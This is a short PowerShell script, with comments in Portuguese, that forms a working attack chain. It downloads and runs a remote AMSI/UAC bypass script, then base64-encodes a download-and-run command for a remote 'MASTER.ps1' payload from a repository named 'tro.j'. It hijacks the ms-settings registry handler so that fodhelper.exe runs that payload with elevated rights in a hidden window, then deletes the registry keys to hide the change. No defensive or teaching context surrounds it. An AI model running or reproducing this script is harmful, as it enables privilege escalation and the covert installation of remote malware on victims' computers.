iex ((New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/EugeneBelford1995/Invoke-BypassII/main/Invoke-BypassII.ps1'))

# Cria um comando base64 para executar o MASTER.ps1 sem problemas de escaping
$cmd = "iex ((New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/gsfv/tro.j/refs/heads/main/MASTER.ps1'))"
$bytes = [System.Text.Encoding]::Unicode.GetBytes($cmd)
$encoded = [Convert]::ToBase64String($bytes)
$program = "powershell.exe -WindowStyle Hidden -NoExit -EncodedCommand $encoded"

# Cria as chaves de registro
New-Item "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Force | Out-Null
New-ItemProperty -Path "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Name "DelegateExecute" -Value "" -Force | Out-Null
Set-ItemProperty -Path "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Name "(default)" -Value $program -Force

# Dispara o bypass
Start-Process "C:\Windows\System32\fodhelper.exe" -WindowStyle Hidden
Start-Sleep 3
Remove-Item "HKCU:\Software\Classes\ms-settings\" -Recurse -Force